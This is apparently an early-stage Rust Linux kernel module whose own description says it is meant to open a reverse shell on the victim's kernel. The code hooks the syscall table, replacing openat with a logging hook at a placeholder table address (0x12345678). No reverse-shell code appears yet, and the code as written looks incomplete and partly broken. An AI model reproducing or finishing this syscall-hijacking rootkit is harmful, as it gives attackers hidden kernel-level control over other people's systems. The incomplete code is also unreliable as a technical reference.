//! Innocent Rusty module

use kernel::prelude::*;
use kernel::c_types::{c_char, c_long, c_void};

module!{
    type: IRM,
    name: "irm",
    author: "Began Bajrami",
    description: "just a chill guy wanting to create a reverse shell on your kernel",
    license: "GPL",
}


struct IRM;

// Original syscall address
static mut ORIGINAL_SYSCALL: Option<unsafe extern "C" fn(c_long, *const c_char, c_long) -> c_long> = None;

unsafe extern "C" fn hooked_openat(dfd: c_long, filename: *const c_char, flags: c_long) -> c_long {
    pr_info!("Hooked openat syscall! Filename: {:?}, Flags: {}\n", filename, flags);

    // Call the original syscall
    if let Some(original) = ORIGINAL_SYSCALL {
        original(dfd, filename, flags)
    } else {
        -1 // Return error if original is unavailable
    }
}

impl kernel::Module for IRM {
    fn init(_module: &'static ThisModule) -> kernel::error::Result<Self> {
        pr_info!("IRM activated\n");

        // Locate and hook the syscall table
        unsafe {
            let syscall_table = locate_syscall_table();
            if let Some(table) = syscall_table {
                // Replace sys_openat with hooked_openat
                ORIGINAL_SYSCALL = Some(core::mem::transmute(table[__NR_openat]));
                table[__NR_openat] = hooked_openat as *const c_void;
            } else {
                pr_err!("Failed to locate syscall table\n");
                return Err(Error::EINVAL);
            }
        }
        
        Ok(IRM)
    }
}

// for now, this is just useless, since the "module" is built-in. I will proceed to make it
// modularized afterwards, since I really to not need right now it to be loadable/unloadable
impl Drop for IRM {
    fn drop(&mut self){
        pr_info!("Why? Nobody likes me, I'm an Innocent chill module ;( \n");
    }
}

const __NR_openat: usize = 257; // Syscall number for openat on x86_64

unsafe fn locate_syscall_table() -> Option<&'static mut [*const c_void]> {
    // Locate the syscall table in memory (specific to kernel version and architecture).
    // WARNING: This is highly kernel-dependent and often requires hardcoded addresses or symbol resolution.
    Some(core::slice::from_raw_parts_mut(SYSCALL_TABLE_ADDRESS as *mut *const c_void, 512))
}

const SYSCALL_TABLE_ADDRESS: usize = 0x12345678; // Replace with the correct address
